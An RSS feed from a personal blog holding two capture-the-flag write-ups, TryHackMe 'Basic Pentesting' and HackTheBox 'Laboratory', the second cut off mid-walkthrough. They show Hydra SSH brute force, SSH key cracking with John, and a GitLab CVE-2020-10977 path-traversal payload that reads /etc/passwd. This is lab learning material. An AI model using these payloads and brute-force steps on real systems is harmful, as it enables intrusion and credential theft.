<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Metasploit on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/metasploit/</link>
    <description>Recent content in Metasploit on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 18 Jun 2021 19:15:35 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>TryHackMe - Basic Pentesting</title>
      <link>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</link>
      <pubDate>Fri, 18 Jun 2021 19:15:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</guid>
      <description>This is a machine that allows you to practise web app hacking and privilege escalation </description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong> <a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Type</strong>: Challenge/CTF</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools</strong>:
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>John the Ripper</li>
<li>smbclient</li>
</ul>
</li>
<li><strong>Skills Learned</strong>
<ul>
<li>Basics of enumeration</li>
<li>Brute-force attack</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 &amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).</p>
<p><img class="img-container" src="imgs/image-20210530002323622.png" alt="image-20210530002323622"  />
</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is allowed on SMB.</p>
<p><img class="img-container" src="imgs/image-20210530004538478-1624087102246.png" alt="image-20210530004538478"  />
</p>
<p>Accessing <code>anonymous</code> share with anonymous logon finds a text file called <code>staff.txt</code>. I&rsquo;ll grab that file to my machine</p>
<p><img class="img-container" src="imgs/image-20210530004922142.png" alt="image-20210530004922142"  />
</p>
<p>The contents of <code>staff.txt</code> reveals two potential usernames: <code>jan</code> and <code>kay</code>.</p>
<p><img class="img-container" src="imgs/image-20210530004937052.png" alt="image-20210530004937052"  />
</p>
<h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Poking the web with <code>curl</code> finds out that it is under maintenance.</p>
<p><img class="img-container" src="imgs/image-20210530004040209.png" alt="image-20210530004040209"  />
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> scan discovers one hidden directory called <code>development</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115»
$ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.67.164/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/05/29 13:43:47 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/development          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.67.164/development/<span style="color:#f92672">]</span>
</code></pre></div><h4 id="development">/development</h4>
<p>The web has enabled directory listing on <code>/development</code>, and there are two text files in this directory:  <code>dev.txt</code> and <code>j.txt</code></p>
<p><img class="img-container" src="imgs/image-20210530010100831.png" alt="image-20210530010100831"  />
</p>
<p><code>j.txt</code>  contains a note from K to J.</p>
<p><img class="img-container" src="imgs/image-20210530010150205.png" alt="image-20210530010150205"  />
</p>
<p>From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.</p>
<p><code>dev.txt</code> contains about project development logs.</p>
<p><img class="img-container" src="imgs/image-20210530010131055.png" alt="image-20210530010131055"  />
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>There are some potential exploits for Apache Structs 2.5.12, which I could try later.</p>
<p><img class="img-container" src="imgs/image-20210619142047338.png" alt="image-20210619142047338"  />
</p>
<h2 id="foothold">Foothold</h2>
<p>For foothold, I have two options: brute force and exploiting Apache Struts.</p>
<p>Brute force might take some time, so I&rsquo;ll leave it on the background and start with Apache Struts.</p>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="apache-struts-rce-cve-2017-9805">Apache Struts RCE CVE-2017-9805</h4>
<p>Metasploit also has an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">exploit module</a> for this, so I&rsquo;ll  fire up  <code>metasploit</code>. But, first, I need to find out the Apache Struts URI.</p>
<p>Looking back to the <code>dev.txt</code> file, it seems Kay uses this <a href="https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase/2.5.12">example showcase</a>.</p>
<p><img class="img-container" src="imgs/image-20210619131650429.png" alt="image-20210619131650429"  />
</p>
<p>I also came across this <a href="https://samsclass.info/124/proj14/p10xstruts.htm">blog post</a> and found this:</p>
<p><img class="img-container" src="imgs/image-20210619132136356.png" alt="image-20210619132136356"  />
</p>
<p>I visited <code>/struts2-rest-showcase-2.5.12/</code>, and it&rsquo;s there.</p>
<p><img class="img-container" src="imgs/image-20210619132449500.png" alt="image-20210619132449500"  />
</p>
<p>It tried it with <code>metasploit</code> and it worked!</p>
<p><img class="img-container" src="imgs/image-20210619142842848.png" alt="image-20210619142842848"  />
</p>
<h3 id="shell-as-jan">Shell as jan</h3>
<h4 id="ssh-brute-force">SSH Brute Force</h4>
<p>It turns out <code>Hydra</code> finds Jan&rsquo;s SSH password in less than 2 minutes. The password is <code>armando</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 
Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.

...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.245.112   login: jan   password: armando
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
...&lt;SNIP&gt;...
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-05-29 14:20:56
</code></pre></div><p>Now I can login as Jan with SSH client.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ ssh jan@10.10.245.112 
jan@10.10.245.112<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>
...&lt;SNIP&gt;...
Last login: Mon Apr <span style="color:#ae81ff">23</span> 15:55:45 <span style="color:#ae81ff">2018</span> from 192.168.56.102
jan@basic2:~$ id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span>
</code></pre></div><p>Since <code>jan</code> has SSH login, I&rsquo;ll definitely use this for enumeration.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="internal-enumeration">Internal Enumeration</h3>
<p>Enumerating Kay&rsquo;s home directory finds a readable SSH key</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ ls -la
total <span style="color:#ae81ff">20</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .
drwxr-xr-x <span style="color:#ae81ff">5</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> ..
-rw-rw-r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> authorized_keys
-rw-r--r-- <span style="color:#ae81ff">1</span> kay kay <span style="color:#ae81ff">3326</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa
-rw-r--r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa.pub
</code></pre></div><p>I tried the key to SSH login locally as user Kay but it asked for a password, so I&rsquo;ll just grab the private key for cracking.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----                                                      
Proc-Type: 4,ENCRYPTED                                                               
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75                               
                                                                                     
IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ                     
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN                     
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX                     
...&lt;SNIP&gt;...
4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
-----END RSA PRIVATE KEY-----
</code></pre></div><h3 id="cracking-id_rsa">Cracking id_rsa</h3>
<p>I&rsquo;ll convert Kay&rsquo;s <code>id_rsa</code> to hash using <code>ssh2john.py</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ /usr/share/john/ssh2john.py kay_rsa &gt; kay_rsa.hash; cat kay_rsa.hash
kay_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712e...&lt;SNIP&gt;...
</code></pre></div><p><code>JtR</code> finds the password:  <code>beeswax</code>.</p>
<p><img class="img-container" src="imgs/image-20210530013632605.png" alt="image-20210530013632605"  />
</p>
<h3 id="ssh---kay">SSH - Kay</h3>
<p>Interestingly, Kay&rsquo;s is in the sudo group.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ chmod <span style="color:#ae81ff">600</span> kay_rsa <span style="color:#f92672">&amp;&amp;</span> ssh -i kay_rsa kay@10.10.245.112
Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;kay_rsa&#39;</span>: 
Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...
Last login: Mon Apr <span style="color:#ae81ff">23</span> 16:04:07 <span style="color:#ae81ff">2018</span> from 192.168.56.102
kay@basic2:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
</code></pre></div><p>From here, I only need Kay&rsquo;s password.</p>
<h3 id="su---root">SU - root</h3>
<p>In Kay&rsquo;s home directory,t here is a file called <code>pass.bak</code>. It contains this string:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</code></pre></div><p>I tried the string as Kay&rsquo;s password on <code>sudo su -</code> and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kay@basic2:~$ sudo su -
root@basic2:~# id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
root@basic2:~# ls -l
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1017</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> flag.txt
</code></pre></div><p>The flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Congratulations! You&#39;ve completed this challenge. There are two ways (that I&#39;m aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you&#39;ll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it&#39;s not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you&#39;ll have to dig deeper to find things that aren&#39;t as obvious, and
therefore might&#39;ve been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you&#39;ll send 
me a link! I can be reached at josiah@vt.edu. If you&#39;ve got questions or feedback, please reach
out to me.

Happy hacking!
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://samsclass.info/124/proj14/p10xstruts.htm">https://samsclass.info/124/proj14/p10xstruts.htm</a></li>
<li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Laboratory</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</guid>
      <description>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&amp;rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container finds a private user repository that contains a pair of SSH keys.</description>
      <content:encoded><![CDATA[<p>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container finds a private user repository that contains a pair of  SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is an SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Arbitrary File Read</li>
<li>Metasploit</li>
<li>Exploiting GitLab 12.8.1~12.9.0</li>
<li>Recover git repository</li>
<li>SUID exploitation</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>searchsploit - Preinstalled in Kali Linux</li>
<li>Metasploit - Preinstalled in Kali Linux</li>
<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp  open  http     Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: The Laboratory
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName<span style="color:#f92672">=</span>laboratory.htb
| Public Key type: rsa
| Public Key bits: <span style="color:#ae81ff">4096</span>
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:   <span style="color:#ae81ff">2873</span> 91a5 <span style="color:#ae81ff">5022</span> f323 4b95 df98 b61a eb6c
|_SHA-1: <span style="color:#ae81ff">0875</span> 3a7e eef6 8f50 <span style="color:#ae81ff">0349</span> 510d 9fbf abc3 c70a a1ca
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
<p>On the HTTPS port, the certificate discloses a subdomain.</p>
<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ echo <span style="color:#e6db74">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
<p>There is nothing really interesting here.</p>
<p><img class="img-container" src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  />
</p>
<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
<p>A GitLab instance is presented on this page.</p>
<p><img class="img-container" src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  />
</p>
<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
<p><img class="img-container" src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  />
</p>
<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
<p><img class="img-container" src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  />
</p>
<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
<p><img class="img-container" src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  />
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ searchsploit gitlab
------------------------------------------------------------------------- -----------------------------
Exploit Title                                                           |  Path
------------------------------------------------------------------------- -----------------------------
GitLab - <span style="color:#e6db74">&#39;impersonate&#39;</span> Feature Privilege Escalation                      | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                  | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                | ruby/webapps/49257.py
GitLab 12.9.0 - Arbitrary File Read                                      | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span>                      | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                             | php/webapps/30329.sh
Gitlab-shell - Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                               | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - <span style="color:#e6db74">&#39;repository&#39;</span> Remote Command Execution          | json/webapps/47420.txt
------------------------------------------------------------------------- ------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
<blockquote>
<p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
</blockquote>
<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  />
</p>
<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">![<span style="color:#f92672">a</span>](<span style="color:#a6e22e">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</code></pre></div><p><img class="img-container" src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  />
</p>
<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
<p><img class="img-container" src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  />
</p>
<p>The payload will then turn into an attached file.</p>
<p><img class="img-container" src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  />
</p>
<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
<p><img class="img-container" src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  />
</p>
<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf

...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Target        : https://git.laboratory.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username      : iamf
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password      : iamfiamf
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Project Names : ProjectOne, ProjectTwo

<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying to Login...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login Successful!
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating ProjectOne...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ProjectOne Created Successfully!
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating ProjectTwo...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ProjectTwo Created Successfully!
<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Absolute Path to File : /etc/passwd
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating an Issue...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Issue Created Successfully!
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Moving Issue...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Issue Moved Successfully!
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd

&gt; /etc/passwd
----------------------------------------

...&lt;SNIP&gt;...
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
...&lt;SNIP&gt;...
</code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
